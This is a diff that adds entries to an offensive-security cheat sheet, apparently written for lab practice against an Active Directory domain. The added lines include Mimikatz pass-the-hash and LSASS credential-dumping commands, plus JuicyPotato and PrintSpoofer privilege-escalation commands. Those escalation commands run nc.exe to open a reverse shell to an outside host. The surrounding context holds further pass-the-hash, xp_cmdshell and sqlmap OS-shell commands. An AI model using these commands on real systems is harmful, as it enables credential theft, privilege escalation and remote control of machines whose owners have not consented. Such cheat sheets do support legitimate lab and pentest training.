@@ -732,6 +732,8 @@ crackmapexec smb DC01 -u user -p password -d INLANEFREIGHT.LOCAL
 
 #PtH
 crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294
+#PTH Mimikatz
+sekurlsa::pth /user:Administrator /domain:. /ntlm:<hash> /run:cmd.exe
 
 # Null-session with the rpcclient.
 rpcclient -U'%' 10.10.110.17
@@ -767,6 +769,7 @@ EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmi
 
 # mssqlclient.py
 mssqlclient.py INLANEFREIGHT/account@172.16.5.50
+mssqlclient.py sql_dev@10.129.43.30 -windows-auth
                                                     
 xp_cmdshell
 xp_cmdshell "whoami /priv"
@@ -1234,6 +1237,10 @@ mimikatz # base64 /out:true
 # Mimikatz command used to extract the TGS tickets from a Windows-based host.
 kerberos::list /export
 
+# More on Mimikatz
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+
 # Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
 echo "<base64 blob>" | tr -d \\n
 
@@ -1509,10 +1516,25 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell	Spawning an OS shell
 ```
 
 ## SeImpersonatePrivilege PtatoFamily
+
+#[JuicyPotato](https://github.com/ohpe/juicy-potato) 
 ```
-#[JuicyPotato](https://github.com/ohpe/juicy-potato)
+#JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards
+#Juicy Potato
+c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+
+```
+
 #[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+
+```
+xp_cmdshell C:\Tools\PrintSpoofer.exe -c "c:\Tools\nc.exe 10.10.14.3 8443 -e cmd"
+
+```
+
 #[RoguePotato](https://github.com/antonioCoco/RoguePotato)
+
+```
 
 ```
 
